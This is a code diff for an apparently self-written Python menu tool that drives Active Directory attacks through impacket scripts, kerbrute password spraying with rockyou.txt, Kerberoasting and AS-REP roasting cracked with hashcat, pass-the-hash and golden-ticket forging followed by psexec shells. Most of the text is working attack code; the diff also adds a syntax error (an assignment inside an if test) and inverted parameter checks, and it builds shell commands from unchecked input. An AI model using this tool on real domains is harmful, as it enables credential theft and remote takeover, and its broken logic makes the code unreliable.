@@ -33,7 +33,7 @@ from termcolor import colored					# pip install termcolor
 # -------------------------------------------------------------------------------------
 
 if os.geteuid() != 0:
-    print("\nPlease run this python3 script as root...")
+    print("\n[*] Please run this python3 script as root...")
     exit(True)
 
 if len(sys.argv) < 3:
@@ -101,11 +101,10 @@ def display():
    else:
       print(colored(DNS[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[0],'blue'), end=' ')
-#   print(colored(SHA0,'blue'), end=' ')
+   print(colored(SHAR[0],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[0],'blue'), end=' ')
-   print(colored(PA[0],'blue'), end=' ')
+   print(colored(USER[0],'blue'), end=' ')
+   print(colored(PASS[0],'blue'), end=' ')
    print('\u2551')
    print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
    if TIP == "EMPTY              ":
@@ -113,11 +112,10 @@ def display():
    else:
       print(colored(TIP[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[1],'blue'), end=' ')
-#   print(colored(SHA1,'blue'), end=' ')
+   print(colored(SHAR[1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[1],'blue'), end=' ')
-   print(colored(PA[1],'blue'), end=' ')
+   print(colored(USER[1],'blue'), end=' ')
+   print(colored(PASS[1],'blue'), end=' ')
    print('\u2551')
 
    print('\u2551' + " USERNAME     " + '\u2502', end=' ')
@@ -126,11 +124,10 @@ def display():
    else:
       print(colored(USR[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[2],'blue'), end=' ')
-#   print(colored(SHA2,'blue'), end=' ')
+   print(colored(SHAR[2],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[2],'blue'), end=' ')
-   print(colored(PA[2],'blue'), end=' ')
+   print(colored(USER[2],'blue'), end=' ')
+   print(colored(PASS[2],'blue'), end=' ')
    print('\u2551')
 
    print('\u2551' + " PASSWORD     " + '\u2502', end=' ')
@@ -139,11 +136,10 @@ def display():
    else:
       print(colored(PAS[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[3],'blue'), end=' ')
-#   print(colored(SHA3,'blue'), end=' ')
+   print(colored(SHAR[3],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[3],'blue'), end=' ')
-   print(colored(PA[3],'blue'), end=' ')
+   print(colored(USER[3],'blue'), end=' ')
+   print(colored(PASS[3],'blue'), end=' ')
    print('\u2551')
 
    print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
@@ -152,11 +148,10 @@ def display():
    else:
       print(colored(NTM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[4],'blue'), end=' ')
-#   print(colored(SHA4,'blue'), end=' ')
+   print(colored(SHAR[4],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[4],'blue'), end=' ')
-   print(colored(PA[4],'blue'), end=' ')
+   print(colored(USER[4],'blue'), end=' ')
+   print(colored(PASS[4],'blue'), end=' ')
    print('\u2551')
 
    print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
@@ -165,11 +160,10 @@ def display():
    else:
       print(colored(DOM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[5],'blue'), end=' ')
-#   print(colored(SHA5,'blue'), end=' ')
+   print(colored(SHAR[5],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[5],'blue'), end=' ')
-   print(colored(PA[5],'blue'), end=' ')
+   print(colored(USER[5],'blue'), end=' ')
+   print(colored(PASS[5],'blue'), end=' ')
    print('\u2551')
 
    print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
@@ -178,11 +172,10 @@ def display():
    else:
       print(colored(SID[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[6],'blue'), end=' ')
-#   print(colored(SHA6,'blue'), end=' ')
+   print(colored(SHAR[6],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[6],'blue'), end=' ')
-   print(colored(PA[6],'blue'), end=' ')
+   print(colored(USER[6],'blue'), end=' ')
+   print(colored(PASS[6],'blue'), end=' ')
    print('\u2551')     
 
    print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
@@ -191,11 +184,10 @@ def display():
    else:
       print(colored(TSH[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[7],'blue'), end=' ')
-#   print(colored(SHA7,'blue'), end=' ')
+   print(colored(SHAR[7],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[7],'blue'), end=' ')
-   print(colored(PA[7],'blue'), end=' ')
+   print(colored(USER[7],'blue'), end=' ')
+   print(colored(PASS[7],'blue'), end=' ')
    print('\u2551')   
 
    print('\u2551' + " IMPERSONATE  " + '\u2502', end=' ')
@@ -204,11 +196,10 @@ def display():
    else:
       print(colored(IMP[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[8],'blue'), end=' ')
-#   print(colored(SHA8,'blue'), end=' ')
+   print(colored(SHAR[8],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[8],'blue'), end=' ')
-   print(colored(PA[8],'blue'), end=' ')
+   print(colored(USER[8],'blue'), end=' ')
+   print(colored(PASS[8],'blue'), end=' ')
    print('\u2551')      
 
    print('\u2551' + " WIN COMMAND  " + '\u2502', end=' ')
@@ -217,11 +208,10 @@ def display():
    else:
       print(colored(CMD[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[9],'blue'), end=' ')
-#   print(colored(SHA9,'blue'), end=' ')
+   print(colored(SHAR[9],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[9],'blue'), end=' ')
-   print(colored(PA[9],'blue'), end=' ')
+   print(colored(USER[9],'blue'), end=' ')
+   print(colored(PASS[9],'blue'), end=' ')
    print('\u2551')
 
    print('\u2551' + " CURRENT TIME " + '\u2502', end=' ')
@@ -230,11 +220,10 @@ def display():
    else:
       print(colored(LTM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[10],'blue'), end=' ')
-#   print(colored(SHA10,'blue'), end=' ')
+   print(colored(SHAR[10],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(US[10],'blue'), end=' ')
-   print(colored(PA[10],'blue'), end=' ')
+   print(colored(USER[10],'blue'), end=' ')
+   print(colored(PASS[10],'blue'), end=' ')
    print('\u2551')   
 
    print('\u2551' + " MY DIRECTORY " + '\u2502', end=' ')
@@ -243,14 +232,13 @@ def display():
    else:
       print(colored(DIR[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
-   print(colored(SH[11],'blue'), end=' ')
-#   print(colored(SHA11,'blue'), end=' ')
+   print(colored(SHAR[11],'blue'), end=' ')
    print('\u2551', end=' ')
-   if US[11] == "Some users are not shown!!":
-      print(colored(US[11],'red'), end=' ')
+   if USER[12][:1] != " ":
+      print(colored(USER[11],'red'), end=' ')
    else:
-      print(colored(US[11],'blue'), end=' ')
-   print(colored(PA[11],'blue'), end=' ')
+      print(colored(USER[11],'blue'), end=' ')
+   print(colored(PASS[11],'blue'), end=' ')
    print('\u2551')
 
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*21  + '\u2569' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*61 + '\u2563')
@@ -293,7 +281,7 @@ print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-print("[*] Booting - Please wait...\n")
+print("[*] Booting - [*] Please wait...\n")
 if not os.path.exists("WORKAREA"):			
    os.mkdir("WORKAREA")
    print("[+] Work area created...")
@@ -304,20 +292,22 @@ if not os.path.exists("users.txt"):
    command("touch users.txt")
    print("[+] File users.txt created...")
 else:
-   print("[+] File users.txt already exists...")	# DEFUALT KERBEROS LIST
+   print("[+] File users.txt already exists...")	# USER LIST
 
 print("[+] Populating system variables...")
 
 PATH = "/usr/share/doc/python3-impacket/examples/" 	# IMPACKET LOCATION
-SKEW = 0         # TIME
-COL1 = 19	 # SESSION
-COL2 = 31	 # SHARE
-COL3 = 26	 # USERNAME
-COL4 = 32	 # PASSWORD
-MAX  = 40	 # 0 - 39
-SH   = [" "*COL2]*MAX
-US   = [" "*COL3]*MAX
-PA   = [" "*COL4]*MAX
+
+SKEW = 0         	# TIME SKEW
+COL1 = 19	 	# SESSIONS
+COL2 = 31	 	# SHARE NAMES
+COL3 = 26	 	# USER NAMES
+COL4 = 32	 	# PASSWORDS
+MAXX = 40		# 0 - 39
+
+SHAR = [" "*COL2]*MAXX	# SHARE NAMES
+USER = [" "*COL3]*MAXX	# USER NAMES
+PASS = [" "*COL4]*MAXX  # PASSWORDS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -331,12 +321,12 @@ if not os.path.exists('config.txt'):
    print("[+] Configuration file not found - using defualt values...")
    DNS = "EMPTY              " # DNS NAME
    TIP = "EMPTY              " # REMOTE IP
-   USR = '""                 ' # USERNAME
-   PAS = '""                 ' # PASSWORD       
+   USR = '""                 ' # SESSION USERNAME
+   PAS = '""                 ' # SESSION PASSWORD       
    NTM = "EMPTY              " # NTLM HASH
    DOM = "EMPTY              " # DOMAIN NAME
    SID = "EMPTY              " # DOMAIN SID
-   TSH = "EMPTY              " # CURRENT SHARE
+   TSH = "EMPTY              " # SESSION SHARE
    IMP = "Administrator      " # IMPERSONATE
    CMD = "whoami             " # WINDOWS COMMAND                                            
    LTM = "00:00              " # LOCAL TIME    
@@ -375,7 +365,7 @@ command("neo4j start   >> log.txt 2>&1")
 # command("neo4j console >> log.txt 2>&1")
 os.remove("log.txt")
 
-input("\nPlease ENTER key to continue...")
+input("\n[*] Please ENTER key to continue...")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -391,7 +381,7 @@ while True:
    LTM = gettime(COL1)
    display()
    options()
-   selection=input("Please Select: ")
+   selection=input("[*] Please Select: ")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -437,13 +427,13 @@ while True:
 
    if selection =='1':
       BAK = DNS
-      DNS = input("\nPlease enter DNS SERVER name: ")
+      DNS = input("\n[*] Please enter DNS SERVER name: ")
 
       if DNS != "":
          if len(DNS) < COL1:
             DNS = padding(DNS, COL1)
          command("echo '" + TIP.rstrip(" ") + "\t" + DNS.rstrip(" ") + "' >> /etc/hosts")
-         print("DNS SERVER " + DNS.rstrip(" ") + " has been added to /etc/hosts...")
+         print("\n[+] DNS SERVER " + DNS.rstrip(" ") + " has been added to /etc/hosts...")
          prompt()
       else:
          DNS = BAK      
@@ -458,7 +448,7 @@ while True:
 
    if selection =='2':
       BAK = TIP
-      TIP = input("\nPlease enter REMOTE IP address: ")
+      TIP = input("\n[*] Please enter REMOTE IP address: ")
 
       if TIP == "":
          TIP = BAK
@@ -476,14 +466,14 @@ while True:
 
    if selection == '3':
       BAK = USR
-      USR = input("\nPlease enter USERNAME: ")
+      USR = input("\n[*] Please enter USERNAME: ")
 
       if USR != "":
          if len(USR) < COL1:
             USR = padding(USR, COL1)
-         for a in range(0, MAX):
-            if US[a].rstrip(" ") == USR.rstrip(" "):
-               NTM = PA[a]	# UPDATE HASH VALUE TO MATCH USER.
+         for a in range(0, MAXX):
+            if USER[a].rstrip(" ") == USR.rstrip(" "):
+               NTM = PASS[a]	# UPDATE HASH VALUE TO MATCH USER.
       else:
          USR = BAK
 
@@ -497,7 +487,7 @@ while True:
 
    if selection == '4':
       BAK = PAS
-      PAS = input("\nPlease enter PASSWORD: ")
+      PAS = input("\n[*] Please enter PASSWORD: ")
 
       if PAS != "":
          if len(PAS) < COL1:
@@ -515,7 +505,7 @@ while True:
 
    if selection == '5':
       BAK = NTM
-      NTM = input("\nPlease enter HASH value: ")
+      NTM = input("\n[*] Please enter HASH value: ")
 
       if NTM != "":
          if len(NTM) < COL1:
@@ -533,7 +523,7 @@ while True:
 
    if selection == '6':
       BAK = DOM
-      DOM = input("\nPlease enter DOMAIN name: ")
+      DOM = input("\n[*] Please enter DOMAIN name: ")
 
       if DOM != "":
          if len(DOM) < COL1:
@@ -554,7 +544,7 @@ while True:
 
    if selection == '7':
       BAK = SID
-      SID = input("\nPlease enter DOMAIN SID value: ")
+      SID = input("\n[*] Please enter DOMAIN SID value: ")
 
       if SID != "":
          if len(SID) < COL1:
@@ -572,7 +562,7 @@ while True:
 
    if selection == '8':
       BAK = TSH
-      TSH = input("\nPlease enter SHARE name: ")
+      TSH = input("\n[*] Please enter SHARE name: ")
 
       if TSH != "":
          if len(TSH) < COL1:
@@ -590,7 +580,7 @@ while True:
 
    if selection == '9':
       BAK = IMP
-      IMP = input("\nPlease enter IMPERSONATOR name: ")
+      IMP = input("\n[*] Please enter IMPERSONATOR name: ")
 
       if IMP != "":
          if len(IMP) < COL1:
@@ -608,7 +598,7 @@ while True:
 
    if selection == '10':
       BAK = CMD
-      CMD = input("\nPlease enter Windows COMMAND: ")
+      CMD = input("\n[*] Please enter Windows COMMAND: ")
 
       if CMD != "":
          if len(CMD) < COL1:
@@ -626,7 +616,7 @@ while True:
 
    if selection == '11':
       BAK = LTM
-      LTM = input("\nPlease enter computer TIME: ")
+      LTM = input("\n[*] Please enter computer TIME: ")
 
       if LTM != "":
          command("date --set=" + LTM)
@@ -644,17 +634,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '12':
-      directory = input("\nPlease enter new working DIRECTORY: ")
+      directory = input("\n[*] Please enter new working DIRECTORY: ")
 
       if os.path.exists(directory):
-         print("Directory already exists....")
+         print("\n[-] Directory already exists....")
       else:
          if len(directory) > 0:
             os.mkdir(directory)
             DIR = directory
             if len(DIR) < COL1:
                DIR = padding(DIR, COL1)
-            print("Working directory changed...")
+            print("\n[+] Working directory changed...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -669,7 +659,7 @@ while True:
       if TIP[:5] != "EMPTY":
          command("ping -c 5 "  + TIP.rstrip(" "))
       else:
-         print("Remote IP address not specified...")
+         print("[-] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -681,15 +671,20 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
+      CheckParams = 0
       if (DOM[:5] == "EMPTY"):
-         print("Domain name not specified...")
+         print("\n[-] Domain name not specified...")
+         CheckParams = 1
 
       if (USR[:2] == '""'):
-         print("User name not specified...")
+         print("\n[-] User name not specified...")
+         CheckParams = 1
 
       if (PAS[:2] == '""'): 
-         print("Password not specified...")
-      else:
+         print("\n[-] Password not specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
          command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DOM.rstrip(" ") + " --include-tombstoned -r")
          command("sed -i '1d' records.csv")
          command("\ncat records.csv")
@@ -707,7 +702,7 @@ while True:
       if DNS[:5] != "EMPTY":
          command("fierce -dns " + DNS.rstrip(" "))
       else:
-         print("DNS Server not specified...")
+         print("\n[-] DNS server has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -722,7 +717,7 @@ while True:
       if TIP[:5] != "EMPTY":
          command("nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
       else:
-         print("Remote IP address not specified...")
+         print("\n[-] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -734,10 +729,18 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '17':
-      if (DOM[:5] != "EMPTY") & (TIP[:5] != "EMPTY"):
+      CheckParams = 0
+
+      if DOM[:5] != "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] != "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
          command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
-      else:
-         print("Domain name or remote IP address not specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -752,7 +755,7 @@ while True:
       if TIP[:5] != "EMPTY":
          command("nmap -T4 -F " + TIP.rstrip(" "))
       else:
-         print("Remote IP address not specified...")
+         print("\n[-] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -767,7 +770,7 @@ while True:
       if TIP[:5] != "EMPTY":
          command("nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" "))
       else:
-         print("Remote IP address not specified...")
+         print("\n[-] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -840,10 +843,11 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-
       if USR.rstrip(" ") != "Administrator":
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
-         command("cat SHARES.tmp")    
+         command("cat SHARES.tmp")
+
+#        CODE TO BE ENTERED HERE TO CATCH SHARES
 #         command("sed -i '1,3d' SHARES.tmp")
 #         command("sed -i -e 's/share //g' SHARES.tmp")
 #         os.remove("SHARES.tmp")
@@ -896,7 +900,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '29':
-      ifmap = input("\nEnter MSRPC interface (ifmap) : ")     
+      ifmap = input("\n[*] Please enter MSRPC interface (ifmap) : ")     
       if ifmap != "":
          command(PATH + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
       prompt()
@@ -911,7 +915,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '30':
-      print("\n[*] Trying with null session first...")
+      print("\n[*] Trying with a null session first...")
       command("enum4linux -v " + TIP.rstrip(" "))
       print("\n[*] Now trying with user " + USR.rstrip(" ") + " and password " + PAS.rstrip(" ") + "...")
       command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" "))
@@ -938,7 +942,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      print("\n[+] Please wait....\n")
+      print("\n[+] [*] Enumerating, please wait....\n")
       command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")
       command("cat DOMAIN.tmp | grep SidTypeGroup"); print ("")
       command("cat DOMAIN.tmp | grep SidTypeAlias"); print ("")
@@ -949,7 +953,7 @@ while True:
       os.remove("SID.tmp")
 
       if SIDID != "":
-         SID = SIDID.replace('[*] Domain SID is: ',"")
+         SID = SIDID.replace('[+] Domain SID is: ',"")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -961,7 +965,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      print("\n[+] Please wait...")
+      print("\n[*] Enumerating, please wait...")
       os.remove("users.txt")	# DELETE CURRENT VERSION
       command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
       command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
@@ -969,26 +973,23 @@ while True:
       os.remove("USERS.tmp")
       command("mv USERS2.tmp USERS.tmp")      
 
-      for x in range (0, MAX):
-         US[x] = linecache.getline('USERS.tmp', x+1)
-         if US[x] != "":
-            US[x] = US[x].replace("Found user: ", "")
-            US[x] = US[x].split(",")
-            US[x] = US[x][0]
-            US[x] = padding(US[x], COL3)
-            if US[x] != "":
-               print("[+] Found user " + US[x])
-               command("echo " + US[x] + " >> users.txt")	# ASSIGN USERS NAME
+      for x in range (0, MAXX):
+         USER[x] = linecache.getline('USERS.tmp', x+1)
+         if USER[x] != "":
+            USER[x] = USER[x].replace("Found user: ", "")
+            USER[x] = USER[x].split(",")
+            USER[x] = USER[x][0]
+            USER[x] = padding(USER[x], COL3)
+            if USER[x] != "":
+               print("[+] Found user " + USER[x])
+               command("echo " + USER[x] + " >> users.txt")	# ASSIGN USERS NAME
             else:
-               US[x] = "                          "		# ASSIGN EMPTY USERS
-            PA[x] = "................................"		# RESET PASSWORDS
+               USER[x] = " "*COL3				# ASSIGN EMPTY USERS
+            PASS[x] = "."*COL4					# RESET PASSWORDS
          else:
-            US[x] = "                          "
-            PA[x] = "                                "   
+            USER[x] = " "*COL3
+            PASS[x] = " "*COL4   
    
-      if US[12] != "                          ":
-         US[11] = "Some users are not shown!!..."
-         US[11] = padding(US[11], COL3)
       os.remove("USERS.tmp")	# CLEAR WORK FILE
       print("[*] All done!")
       prompt()
@@ -1094,7 +1095,7 @@ while True:
       os.remove("KUSERS.tmp")	# DELETE FILE
       os.remove("users.txt")	# DELETE OLD FILE
 	
-      for x in range (0, MAX):
+      for x in range (0, MAXX):
          TEMP = linecache.getline("USERS2.tmp", x+1)
          if TEMP != "":
             TEMP = TEMP.replace("|     ", "")
@@ -1102,14 +1103,14 @@ while True:
             TEMP = TEMP.split("@")
             TEMP = TEMP[0]
             if TEMP[:1] != " ":							# CONTAINS DATA
-               US[x] = TEMP							# ASSIGN USER NAME
-               print("[+] Found user ", US[x])
-               command("echo " + US[x] + " >> users.txt")			# EXPORT FOUND USER
+               USER[x] = TEMP							# ASSIGN USER NAME
+               print("[+] Found user ", USER[x])
+               command("echo " + USER[x] + " >> users.txt")			# EXPORT FOUND USER
          else:
-            US[x] = " "*COL3							# ASSIGN EMPTY USER
-         if US[x][:1] != " ": PA[x] = "................................"	# RESET HASH VALUE
-         if len(US[x]) < COL3: US[x] = padding(US[x], COL3)
-         if len(PA[x]) < COL4: PA[x] = padding(PA[x], COL4)
+            USER[x] = " "*COL3							# ASSIGN EMPTY USER
+         if USER[x][:1] != " ": PASS[x] = "."*COL4				# RESET HASH VALUE
+         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+         if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4)
 
       os.remove("USERS2.tmp")
       print("[*] All done!")
@@ -1124,22 +1125,22 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      print("\n[+] Trying all usernames with matching passwords first...")
-      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
+      print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
+      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile passwords.txt")
 
       test1 = linecache.getline("passwords.txt", 1)
-      if test1 == " ":
-         print("\n[+] Now trying all usernames with password " + PAS.rstrip(" ") + "...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile passwords.txt")
-
+      if test1[:1] = "":
+         print("\n[*] Now trying all usernames with matching passwords...")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
+         
       test2 = linecache.getline("passwords.txt", 1)
-      if test2 == " ":
-         print("\n[+] Now trying user Administrator with random passwords...")
+      if test2[1:] == "":
+         print("\n[*] Now trying user Administrator with random passwords...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile passwords.txt")
 
       test3 = linecache.getline("passwords.txt", 1)
-      if test3 == " ":
-         print("\n[+] Now trying all users with random passwords...")
+      if test3[:1] == "":
+         print("\n[*] Now trying all users with random passwords...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
      
       os.remove("passwords.txt")
@@ -1156,11 +1157,11 @@ while True:
    if selection == '43':
       if linecache.getline('users.txt', 1) != " ":
          command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
-         print("\n[+] Cracking hash values if they exists...\n")
+         print("\n[*] Cracking hash values if they exists...\n")
          command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
          command("strings cracked1.txt")
       else:
-         print("The file users.txt is empty...")
+         print("[-] The file users.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1174,11 +1175,11 @@ while True:
    if selection =='44':
       if linecache.getline('users.txt', 1) != " ":
          command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile users.txt")
-         print("\n[+] Cracking hash values if they exists...\n")
+         print("\n[*] Cracking hash values if they exists...\n")
          command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
          command("strings cracked2.txt")
       else:
-         print("The file users.txt is empty...")
+         print("[-] The file users.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1196,11 +1197,11 @@ while True:
          NTM = str(NTM)
          NTM = NTM.lstrip("b'")
          NTM = NTM.rstrip("'")
-         for x in range(0, MAX):
-            if US[x].rstrip(" ") == USR.rstrip(" "): PA[x] = NTM.rstrip(" ") # RESET USERS HASH
+         for x in range(0, MAXX):
+            if USER[x].rstrip(" ") == USR.rstrip(" "): PASS[x] = NTM.rstrip(" ") # RESET USERS HASH
          NTM = padding(NTM, COL4)
       else:
-         print("Password not found...")
+         print("[-] Password not found...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1213,7 +1214,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
 
       if PAS[:1] != "\"":
          command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
@@ -1223,18 +1224,18 @@ while True:
             command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
             command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
          else:
-            print("User password or hash required...")
+            print("[-] User password or hash required...")
 
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
-          print("TGT was not generated...")
+          print("[-] TGT was not generated...")
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "." # Reset value
 
-      for x in range (0, MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PA[x].rstrip(" ")                 # GET HASH
+      for x in range (0, MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+            HASH = PASS[x].rstrip(" ")                 # GET HASH
 
       if HASH != ".":
          command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + IMP.rstrip(" ") + " -hashes :" + HASH)
@@ -1242,7 +1243,7 @@ while True:
          if os.path.exists(IMP.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
          else:
-            print("TGT was not generated...")
+            print("[-] TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1254,7 +1255,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      print("\nPass the Ticket has not been implemented yet...")
+      print("\nSorry, Pass-the-Ticket has not been implemented yet...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1267,25 +1268,25 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
 
       if (NTM[:1] != "") & (SID[:1] != ""):
          command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + USR.rstrip(" "))
          command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
       else:
-         print("Hash or Domain-SID not found...")
+         print("\n[-] Hash or Domain-SID not found...")
 
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
-          print("Golden TGT was not generated...")      
+          print("\n[-] Golden TGT was not generated...")      
 
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "." # Reset value
 
-      for x in range (0, MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PA[x].rstrip(" ")                 # GET HASH
+      for x in range (0, MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+            HASH = PASS[x].rstrip(" ")                 # GET HASH
 
       if HASH != ".":
